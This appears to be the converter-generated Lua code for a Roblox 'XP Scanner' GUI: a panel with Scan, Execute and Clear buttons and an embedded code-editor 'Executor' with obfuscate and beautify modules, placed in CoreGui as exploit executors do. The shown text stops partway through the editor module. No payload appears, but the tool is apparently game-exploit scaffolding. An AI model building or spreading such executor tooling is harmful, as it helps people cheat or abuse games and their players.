--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
]=]

-- Instances: 71 | Scripts: 5 | Modules: 12 | Tags: 0
local G2L = {};

-- StarterGui.XP Scanner
G2L["1"] = Instance.new("ScreenGui", game:GetService("CoreGui"):WaitForChild("RobloxGui"));
G2L["1"]["Name"] = [[XP Scanner]];
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
G2L["1"]["ResetOnSpawn"] = false;


-- StarterGui.XP Scanner.Frame
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["BorderSizePixel"] = 2;
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2"]["Size"] = UDim2.new(0, 498, 0, 231);
G2L["2"]["Position"] = UDim2.new(0.12586, 0, 0.22814, 0);
G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);


-- StarterGui.XP Scanner.Frame.Ex
G2L["3"] = Instance.new("TextButton", G2L["2"]);
G2L["3"]["TextWrapped"] = true;
G2L["3"]["TextStrokeTransparency"] = 0;
G2L["3"]["BorderSizePixel"] = 0;
G2L["3"]["TextSize"] = 14;
G2L["3"]["TextScaled"] = true;
G2L["3"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3"]["Size"] = UDim2.new(0, 195, 0, 32);
G2L["3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3"]["Text"] = [[Execute]];
G2L["3"]["Name"] = [[Ex]];
G2L["3"]["Visible"] = false;
G2L["3"]["Position"] = UDim2.new(0.04401, 0, 0.77488, 0);


-- StarterGui.XP Scanner.Frame.Ex.LocalScript
G2L["4"] = Instance.new("LocalScript", G2L["3"]);



-- StarterGui.XP Scanner.Frame.Ex.UIStroke
G2L["5"] = Instance.new("UIStroke", G2L["3"]);
G2L["5"]["Thickness"] = 3;
G2L["5"]["Color"] = Color3.fromRGB(0, 255, 0);


-- StarterGui.XP Scanner.Frame.Ex.UIStroke
G2L["6"] = Instance.new("UIStroke", G2L["3"]);
G2L["6"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["6"]["Color"] = Color3.fromRGB(0, 255, 0);


-- StarterGui.XP Scanner.Frame.Ex.UICorner
G2L["7"] = Instance.new("UICorner", G2L["3"]);



-- StarterGui.XP Scanner.Frame.TextButton
G2L["8"] = Instance.new("TextButton", G2L["2"]);
G2L["8"]["TextWrapped"] = true;
G2L["8"]["TextStrokeTransparency"] = 0;
G2L["8"]["TextSize"] = 14;
G2L["8"]["TextScaled"] = true;
G2L["8"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["8"]["Size"] = UDim2.new(0, 350, 0, 100);
G2L["8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8"]["Text"] = [[Scan]];
G2L["8"]["Position"] = UDim2.new(0.14679, 0, 0.28044, 0);


-- StarterGui.XP Scanner.Frame.TextButton.LocalScript
G2L["9"] = Instance.new("LocalScript", G2L["8"]);



-- StarterGui.XP Scanner.Frame.TextButton.UICorner
G2L["a"] = Instance.new("UICorner", G2L["8"]);



-- StarterGui.XP Scanner.Frame.TextButton.UIStroke
G2L["b"] = Instance.new("UIStroke", G2L["8"]);
G2L["b"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["b"]["Color"] = Color3.fromRGB(255, 255, 0);


-- StarterGui.XP Scanner.Frame.TextButton.UIStroke
G2L["c"] = Instance.new("UIStroke", G2L["8"]);
G2L["c"]["Thickness"] = 3;
G2L["c"]["Color"] = Color3.fromRGB(255, 255, 0);


-- StarterGui.XP Scanner.Frame.Key
G2L["d"] = Instance.new("StringValue", G2L["2"]);
G2L["d"]["Name"] = [[Key]];


-- StarterGui.XP Scanner.Frame.MainText
G2L["e"] = Instance.new("TextLabel", G2L["2"]);
G2L["e"]["TextWrapped"] = true;
G2L["e"]["TextStrokeTransparency"] = 0;
G2L["e"]["BorderSizePixel"] = 0;
G2L["e"]["TextSize"] = 14;
G2L["e"]["TextScaled"] = true;
G2L["e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["e"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e"]["BackgroundTransparency"] = 1;
G2L["e"]["Size"] = UDim2.new(0, 498, 0, 50);
G2L["e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e"]["Text"] = [[XP Scanner]];
G2L["e"]["Name"] = [[MainText]];
G2L["e"]["Position"] = UDim2.new(-0.00197, 0, 0, 0);


-- StarterGui.XP Scanner.Frame.MainText.UIStroke
G2L["f"] = Instance.new("UIStroke", G2L["e"]);
G2L["f"]["Thickness"] = 3;
G2L["f"]["Color"] = Color3.fromRGB(255, 0, 0);


-- StarterGui.XP Scanner.Frame.Cl
G2L["10"] = Instance.new("TextButton", G2L["2"]);
G2L["10"]["TextWrapped"] = true;
G2L["10"]["TextStrokeTransparency"] = 0;
G2L["10"]["BorderSizePixel"] = 0;
G2L["10"]["TextSize"] = 14;
G2L["10"]["TextScaled"] = true;
G2L["10"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["10"]["Size"] = UDim2.new(0, 179, 0, 32);
G2L["10"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10"]["Text"] = [[Clear]];
G2L["10"]["Name"] = [[Cl]];
G2L["10"]["Visible"] = false;
G2L["10"]["Position"] = UDim2.new(0.60238, 0, 0.77488, 0);


-- StarterGui.XP Scanner.Frame.Cl.LocalScript
G2L["11"] = Instance.new("LocalScript", G2L["10"]);



-- StarterGui.XP Scanner.Frame.Cl.UIStroke
G2L["12"] = Instance.new("UIStroke", G2L["10"]);
G2L["12"]["Thickness"] = 3;
G2L["12"]["Color"] = Color3.fromRGB(255, 0, 0);


-- StarterGui.XP Scanner.Frame.Cl.UIStroke
G2L["13"] = Instance.new("UIStroke", G2L["10"]);
G2L["13"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["13"]["Color"] = Color3.fromRGB(255, 0, 0);


-- StarterGui.XP Scanner.Frame.Cl.UICorner
G2L["14"] = Instance.new("UICorner", G2L["10"]);



-- StarterGui.XP Scanner.Frame.UIDrag
G2L["15"] = Instance.new("LocalScript", G2L["2"]);
G2L["15"]["Name"] = [[UIDrag]];


-- StarterGui.XP Scanner.Frame.UICorner
G2L["16"] = Instance.new("UICorner", G2L["2"]);



-- StarterGui.XP Scanner.Frame.UIStroke
G2L["17"] = Instance.new("UIStroke", G2L["2"]);
G2L["17"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["17"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.XP Scanner.Frame.Object
G2L["18"] = Instance.new("ObjectValue", G2L["2"]);
G2L["18"]["Name"] = [[Object]];


-- StarterGui.XP Scanner.Frame.Executor
G2L["19"] = Instance.new("Frame", G2L["2"]);
G2L["19"]["Visible"] = false;
G2L["19"]["BorderSizePixel"] = 0;
G2L["19"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["19"]["Size"] = UDim2.new(0, 451, 0, 142);
G2L["19"]["Position"] = UDim2.new(0.04401, 0, 0.21645, 0);
G2L["19"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19"]["Name"] = [[Executor]];
G2L["19"]["BackgroundTransparency"] = 1;


-- StarterGui.XP Scanner.Frame.Executor.Codebox
G2L["1a"] = Instance.new("Frame", G2L["19"]);
G2L["1a"]["BorderSizePixel"] = 0;
G2L["1a"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["1a"]["Size"] = UDim2.new(1, 0, 0.79982, 0);
G2L["1a"]["Position"] = UDim2.new(0.01571, 0, 0.02827, 0);
G2L["1a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a"]["Name"] = [[Codebox]];
G2L["1a"]["BackgroundTransparency"] = 0.5;


-- StarterGui.XP Scanner.Frame.Executor.Codebox.UIStroke
G2L["1b"] = Instance.new("UIStroke", G2L["1a"]);
G2L["1b"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["1b"]["Color"] = Color3.fromRGB(51, 51, 51);


-- StarterGui.XP Scanner.Frame.Executor.Codebox.Textbox
G2L["1c"] = Instance.new("ScrollingFrame", G2L["1a"]);
G2L["1c"]["Active"] = true;
G2L["1c"]["BorderSizePixel"] = 0;
G2L["1c"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["1c"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["1c"]["Name"] = [[Textbox]];
G2L["1c"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["1c"]["AutomaticCanvasSize"] = Enum.AutomaticSize.X;
G2L["1c"]["Size"] = UDim2.new(1.07908, -50, 1, 0);
G2L["1c"]["Position"] = UDim2.new(0.49668, 0, 0.5, 0);
G2L["1c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c"]["ScrollBarThickness"] = 5;
G2L["1c"]["BackgroundTransparency"] = 1;


-- StarterGui.XP Scanner.Frame.Executor.Codebox.Textbox.Input
G2L["1d"] = Instance.new("TextBox", G2L["1c"]);
G2L["1d"]["Name"] = [[Input]];
G2L["1d"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["1d"]["ZIndex"] = 2;
G2L["1d"]["BorderSizePixel"] = 0;
G2L["1d"]["TextTransparency"] = 1;
G2L["1d"]["TextSize"] = 14;
G2L["1d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1d"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["1d"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["1d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1d"]["AutomaticSize"] = Enum.AutomaticSize.XY;
G2L["1d"]["MultiLine"] = true;
G2L["1d"]["ClearTextOnFocus"] = false;
G2L["1d"]["Size"] = UDim2.new(0.96203, 0, 1, 0);
G2L["1d"]["Position"] = UDim2.new(0.03797, 0, 0, 0);
G2L["1d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d"]["Text"] = [[]];
G2L["1d"]["BackgroundTransparency"] = 1;


-- StarterGui.XP Scanner.Frame.Executor.Codebox.Textbox.Input.UIPadding
G2L["1e"] = Instance.new("UIPadding", G2L["1d"]);
G2L["1e"]["PaddingTop"] = UDim.new(0, 5);
G2L["1e"]["PaddingLeft"] = UDim.new(0, 10);


-- StarterGui.XP Scanner.Frame.Executor.Codebox.Textbox.Lines
G2L["1f"] = Instance.new("ScrollingFrame", G2L["1c"]);
G2L["1f"]["Active"] = true;
G2L["1f"]["ScrollingDirection"] = Enum.ScrollingDirection.Y;
G2L["1f"]["BorderSizePixel"] = 0;
G2L["1f"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["1f"]["ScrollingEnabled"] = false;
G2L["1f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1f"]["Name"] = [[Lines]];
G2L["1f"]["ScrollBarImageTransparency"] = 1;
G2L["1f"]["Size"] = UDim2.new(-0.043, 50, 10, 0);
G2L["1f"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1f"]["Position"] = UDim2.new(-0.01535, 0, 0, 0);
G2L["1f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1f"]["ScrollBarThickness"] = 0;
G2L["1f"]["BackgroundTransparency"] = 1;


-- StarterGui.XP Scanner.Frame.Executor.Codebox.Textbox.Lines.Label
G2L["20"] = Instance.new("TextLabel", G2L["1f"]);
G2L["20"]["ZIndex"] = 4;
G2L["20"]["BorderSizePixel"] = 0;
G2L["20"]["TextSize"] = 14;
G2L["20"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["20"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["20"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["20"]["TextColor3"] = Color3.fromRGB(148, 148, 148);
G2L["20"]["BackgroundTransparency"] = 1;
G2L["20"]["RichText"] = true;
G2L["20"]["Size"] = UDim2.new(-0.1559, 50, 1, 0);
G2L["20"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["20"]["Text"] = [[1]];
G2L["20"]["AutomaticSize"] = Enum.AutomaticSize.X;
G2L["20"]["Name"] = [[Label]];
G2L["20"]["Position"] = UDim2.new(0.1559, 0, 0, 0);


-- StarterGui.XP Scanner.Frame.Executor.Codebox.Textbox.Lines.Label.UIStroke
G2L["21"] = Instance.new("UIStroke", G2L["20"]);
G2L["21"]["Transparency"] = 1;
G2L["21"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["21"]["Color"] = Color3.fromRGB(51, 51, 51);


-- StarterGui.XP Scanner.Frame.Executor.Codebox.Textbox.Lines.Label.UIPadding
G2L["22"] = Instance.new("UIPadding", G2L["20"]);
G2L["22"]["PaddingTop"] = UDim.new(0, 5);
G2L["22"]["PaddingRight"] = UDim.new(0, 24);
G2L["22"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.XP Scanner.Frame.Executor.Codebox.UICorner
G2L["23"] = Instance.new("UICorner", G2L["1a"]);



-- StarterGui.XP Scanner.Frame.Executor.Scripts
G2L["24"] = Instance.new("Folder", G2L["19"]);
G2L["24"]["Name"] = [[Scripts]];


-- StarterGui.XP Scanner.Frame.Executor.Scripts.Main
G2L["25"] = Instance.new("LocalScript", G2L["24"]);
G2L["25"]["Name"] = [[Main]];


-- StarterGui.XP Scanner.Frame.Executor.Scripts.Main.haxur
G2L["26"] = Instance.new("ModuleScript", G2L["25"]);
G2L["26"]["Name"] = [[haxur]];


-- StarterGui.XP Scanner.Frame.Executor.Scripts.Main.haxur.Highlighter
G2L["27"] = Instance.new("ModuleScript", G2L["26"]);
G2L["27"]["Name"] = [[Highlighter]];


-- StarterGui.XP Scanner.Frame.Executor.Scripts.Main.haxur.Highlighter.Lexer
G2L["28"] = Instance.new("ModuleScript", G2L["27"]);
G2L["28"]["Name"] = [[Lexer]];


-- StarterGui.XP Scanner.Frame.Executor.Scripts.Main.haxur.Highlighter.Lexer.Language
G2L["29"] = Instance.new("ModuleScript", G2L["28"]);
G2L["29"]["Name"] = [[Language]];


-- StarterGui.XP Scanner.Frame.Executor.Scripts.Main.haxur.CustomInput
G2L["2a"] = Instance.new("ModuleScript", G2L["26"]);
G2L["2a"]["Name"] = [[CustomInput]];


-- StarterGui.XP Scanner.Frame.Executor.Scripts.Main.haxur.CustomInput.InputCursor
G2L["2b"] = Instance.new("Frame", G2L["2a"]);
G2L["2b"]["ZIndex"] = 5;
G2L["2b"]["BorderSizePixel"] = 0;
G2L["2b"]["BackgroundColor3"] = Color3.fromRGB(162, 162, 162);
G2L["2b"]["Size"] = UDim2.new(0, 4, 0, 20);
G2L["2b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2b"]["Name"] = [[InputCursor]];
G2L["2b"]["BackgroundTransparency"] = 1;


-- StarterGui.XP Scanner.Frame.Executor.Scripts.Main.haxur.CustomInput.LineHighlighter
G2L["2c"] = Instance.new("Frame", G2L["2a"]);
G2L["2c"]["BorderSizePixel"] = 0;
G2L["2c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2c"]["Size"] = UDim2.new(1, 5, 0, 14);
G2L["2c"]["Position"] = UDim2.new(0, -2, 0, 0);
G2L["2c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2c"]["Name"] = [[LineHighlighter]];
G2L["2c"]["BackgroundTransparency"] = 0.9;


-- StarterGui.XP Scanner.Frame.Executor.Scripts.Main.haxur.CustomInput.LineHighlighter.Outline
G2L["2d"] = Instance.new("UIStroke", G2L["2c"]);
G2L["2d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["2d"]["Name"] = [[Outline]];
G2L["2d"]["Color"] = Color3.fromRGB(46, 46, 46);


-- StarterGui.XP Scanner.Frame.Executor.Scripts.Main.haxur.CustomInput.LineHighlighter.UIPadding
G2L["2e"] = Instance.new("UIPadding", G2L["2c"]);
G2L["2e"]["PaddingLeft"] = UDim.new(0, 10);


-- StarterGui.XP Scanner.Frame.Executor.Scripts.Main.haxur.Lines
G2L["2f"] = Instance.new("ModuleScript", G2L["26"]);
G2L["2f"]["Name"] = [[Lines]];


-- StarterGui.XP Scanner.Frame.Executor.Scripts.Main.haxur.Indenter
G2L["30"] = Instance.new("ModuleScript", G2L["26"]);
G2L["30"]["Name"] = [[Indenter]];


-- StarterGui.XP Scanner.Frame.Executor.Scripts.Main.haxur.Autocomplete
G2L["31"] = Instance.new("ModuleScript", G2L["26"]);
G2L["31"]["Name"] = [[Autocomplete]];


-- StarterGui.XP Scanner.Frame.Executor.Scripts.Main.haxur.Autocomplete.AutocompleteFrame
G2L["32"] = Instance.new("Frame", G2L["31"]);
G2L["32"]["ZIndex"] = 5;
G2L["32"]["BorderSizePixel"] = 0;
G2L["32"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
G2L["32"]["AutomaticSize"] = Enum.AutomaticSize.Y;
G2L["32"]["Size"] = UDim2.new(0, 200, 0, 0);
G2L["32"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["32"]["Name"] = [[AutocompleteFrame]];


-- StarterGui.XP Scanner.Frame.Executor.Scripts.Main.haxur.Autocomplete.AutocompleteFrame.UIStroke
G2L["33"] = Instance.new("UIStroke", G2L["32"]);
G2L["33"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["33"]["Color"] = Color3.fromRGB(51, 51, 51);


-- StarterGui.XP Scanner.Frame.Executor.Scripts.Main.haxur.Autocomplete.AutocompleteFrame.UIListLayout
G2L["34"] = Instance.new("UIListLayout", G2L["32"]);
G2L["34"]["VerticalAlignment"] = Enum.VerticalAlignment.Bottom;
G2L["34"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.XP Scanner.Frame.Executor.Scripts.Main.haxur.Autocomplete.AutocompleteFrame.UICorner
G2L["35"] = Instance.new("UICorner", G2L["32"]);
G2L["35"]["CornerRadius"] = UDim.new(0, 5);


-- StarterGui.XP Scanner.Frame.Executor.Scripts.Main.haxur.Autocomplete.Language
G2L["36"] = Instance.new("ModuleScript", G2L["31"]);
G2L["36"]["Name"] = [[Language]];


-- StarterGui.XP Scanner.Frame.Executor.Scripts.Main.haxur.Autocomplete.Palete
G2L["37"] = Instance.new("TextButton", G2L["31"]);
G2L["37"]["RichText"] = true;
G2L["37"]["BorderSizePixel"] = 0;
G2L["37"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["37"]["TextSize"] = 14;
G2L["37"]["TextColor3"] = Color3.fromRGB(226, 226, 226);
G2L["37"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["37"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["37"]["ZIndex"] = 6;
G2L["37"]["BackgroundTransparency"] = 1;
G2L["37"]["Size"] = UDim2.new(0, 200, 0, 25);
G2L["37"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["37"]["Text"] = [[getfenv]];
G2L["37"]["Name"] = [[Palete]];


-- StarterGui.XP Scanner.Frame.Executor.Scripts.Main.haxur.Autocomplete.Palete.UIPadding
G2L["38"] = Instance.new("UIPadding", G2L["37"]);
G2L["38"]["PaddingLeft"] = UDim.new(0, 35);


-- StarterGui.XP Scanner.Frame.Executor.Scripts.Main.haxur.Autocomplete.Palete.Icon
G2L["39"] = Instance.new("ImageLabel", G2L["37"]);
G2L["39"]["ZIndex"] = 6;
G2L["39"]["BorderSizePixel"] = 0;
G2L["39"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["39"]["ImageColor3"] = Color3.fromRGB(255, 0, 0);
G2L["39"]["AnchorPoint"] = Vector2.new(1, 0.5);
G2L["39"]["Image"] = [[rbxassetid://12348119032]];
G2L["39"]["Size"] = UDim2.new(0, 15, 0, 15);
G2L["39"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["39"]["BackgroundTransparency"] = 1;
G2L["39"]["Name"] = [[Icon]];
G2L["39"]["Position"] = UDim2.new(0, -10, 0.5, 0);


-- StarterGui.XP Scanner.Frame.Executor.Scripts.Main.haxur.Autocomplete.Palete.UICorner
G2L["3a"] = Instance.new("UICorner", G2L["37"]);
G2L["3a"]["CornerRadius"] = UDim.new(0, 5);


-- StarterGui.XP Scanner.Frame.Executor.Scripts.Main.haxur.Shared
G2L["3b"] = Instance.new("ModuleScript", G2L["26"]);
G2L["3b"]["Name"] = [[Shared]];


-- StarterGui.XP Scanner.Frame.Executor.Scripts.Main.haxur.Textbox
G2L["3c"] = Instance.new("Frame", G2L["26"]);
G2L["3c"]["BorderSizePixel"] = 0;
G2L["3c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3c"]["ClipsDescendants"] = true;
G2L["3c"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["3c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3c"]["Name"] = [[Textbox]];
G2L["3c"]["BackgroundTransparency"] = 1;


-- StarterGui.XP Scanner.Frame.Executor.Scripts.Main.haxur.Textbox.Main
G2L["3d"] = Instance.new("Frame", G2L["3c"]);
G2L["3d"]["BorderSizePixel"] = 0;
G2L["3d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3d"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["3d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3d"]["Name"] = [[Main]];
G2L["3d"]["BackgroundTransparency"] = 1;


-- StarterGui.XP Scanner.Frame.Executor.Scripts.Main.haxur.Textbox.Others
G2L["3e"] = Instance.new("Frame", G2L["3c"]);
G2L["3e"]["BorderSizePixel"] = 0;
G2L["3e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3e"]["ClipsDescendants"] = true;
G2L["3e"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["3e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3e"]["Name"] = [[Others]];
G2L["3e"]["BackgroundTransparency"] = 1;


-- StarterGui.XP Scanner.Frame.Executor.Scripts.Main.haxur.Textbox.Others.Hidden
G2L["3f"] = Instance.new("Frame", G2L["3e"]);
G2L["3f"]["Visible"] = false;
G2L["3f"]["BorderSizePixel"] = 0;
G2L["3f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3f"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["3f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3f"]["Name"] = [[Hidden]];
G2L["3f"]["BackgroundTransparency"] = 1;


-- StarterGui.XP Scanner.Frame.Executor.Scripts.Main.haxur.Textbox.Others.Hidden.Icon
G2L["40"] = Instance.new("ImageLabel", G2L["3f"]);
G2L["40"]["BorderSizePixel"] = 0;
G2L["40"]["ScaleType"] = Enum.ScaleType.Fit;
G2L["40"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["40"]["ImageColor3"] = Color3.fromRGB(255, 0, 0);
G2L["40"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["40"]["Image"] = [[rbxassetid://12348119032]];
G2L["40"]["Size"] = UDim2.new(0.4, 0, 0.4, 0);
G2L["40"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["40"]["BackgroundTransparency"] = 1;
G2L["40"]["Name"] = [[Icon]];
G2L["40"]["Position"] = UDim2.new(0.5, 0, 0.3, 0);


-- StarterGui.XP Scanner.Frame.Executor.Scripts.Main.haxur.Textbox.Others.Hidden.TextLabel
G2L["41"] = Instance.new("TextLabel", G2L["3f"]);
G2L["41"]["BorderSizePixel"] = 0;
G2L["41"]["TextSize"] = 20;
G2L["41"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["41"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
G2L["41"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["41"]["BackgroundTransparency"] = 1;
G2L["41"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["41"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["41"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["41"]["Text"] = [[This content is hidden!]];
G2L["41"]["AutomaticSize"] = Enum.AutomaticSize.X;
G2L["41"]["Position"] = UDim2.new(0.5, 0, 0.55, 0);


-- StarterGui.XP Scanner.Frame.Executor.Scripts.Main.haxur.Methods
G2L["42"] = Instance.new("Folder", G2L["26"]);
G2L["42"]["Name"] = [[Methods]];


-- StarterGui.XP Scanner.Frame.Executor.Scripts.Main.haxur.Methods.Beautify
G2L["43"] = Instance.new("ModuleScript", G2L["42"]);
G2L["43"]["Name"] = [[Beautify]];


-- StarterGui.XP Scanner.Frame.Executor.Scripts.Main.haxur.Methods.Obfuscate
G2L["44"] = Instance.new("ModuleScript", G2L["42"]);
G2L["44"]["Name"] = [[Obfuscate]];


-- StarterGui.XP Scanner.Frame.Executor.HiddenFrame
G2L["45"] = Instance.new("Frame", G2L["19"]);
G2L["45"]["Visible"] = false;
G2L["45"]["BorderSizePixel"] = 0;
G2L["45"]["BackgroundColor3"] = Color3.fromRGB(30, 30, 30);
G2L["45"]["Size"] = UDim2.new(1, 0, 0.8, 0);
G2L["45"]["Position"] = UDim2.new(0.01495, 0, 0.02837, 0);
G2L["45"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["45"]["Name"] = [[HiddenFrame]];


-- StarterGui.XP Scanner.Frame.Executor.HiddenFrame.TextLabel
G2L["46"] = Instance.new("TextLabel", G2L["45"]);
G2L["46"]["BorderSizePixel"] = 0;
G2L["46"]["TextSize"] = 25;
G2L["46"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["46"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["46"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["46"]["BackgroundTransparency"] = 1;
G2L["46"]["Size"] = UDim2.new(0, 252, 0, 50);
G2L["46"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["46"]["Text"] = [[Text Hidden]];
G2L["46"]["Position"] = UDim2.new(0.18407, 0, 0.38667, 0);


-- StarterGui.XP Scanner.Frame.Executor.HiddenFrame.TextLabel.UIGradient
G2L["47"] = Instance.new("UIGradient", G2L["46"]);
G2L["47"]["Rotation"] = -88;
G2L["47"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(118, 119, 120)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- Require G2L wrapper
local G2L_REQUIRE = require;
local G2L_MODULES = {};
local function require(Module:ModuleScript)
    local ModuleState = G2L_MODULES[Module];
    if ModuleState then
        if not ModuleState.Required then
            ModuleState.Required = true;
            ModuleState.Value = ModuleState.Closure();
        end
        return ModuleState.Value;
    end;
    return G2L_REQUIRE(Module);
end

G2L_MODULES[G2L["26"]] = {
Closure = function()
    local script = G2L["26"];local Kodobokkusu = {} -- Credits to whoever made this thing
Kodobokkusu.__index = Kodobokkusu

function Kodobokkusu.new(data)
	local self = setmetatable({}, Kodobokkusu)
	
	self._meta = {}
	self._modules = {}
	self._connections = {}
	self._services = {}
	self._states = {}
	self._data = data
	
	if self._data.Parent then else return end

	--// 変数の開始 \\--
	self._modules = {
		Highlighter = require(script.Highlighter),
		Autocomplete = require(script.Autocomplete),
		Lines = require(script.Lines),
		Indenter = require(script.Indenter),
		CustomInput = require(script.CustomInput),
		Shared = require(script.Shared),
		
		Beautify = require(script.Methods.Beautify),
		Obfuscate = require(script.Methods.Obfuscate),
	}
	self._services = {
		RunService = game:GetService("RunService"),
		UserInputService = game:GetService("UserInputService"),
		TextService = game:GetService("TextService"),
	}
	self._states = {
		Focused = false,
		RemovingText = false,
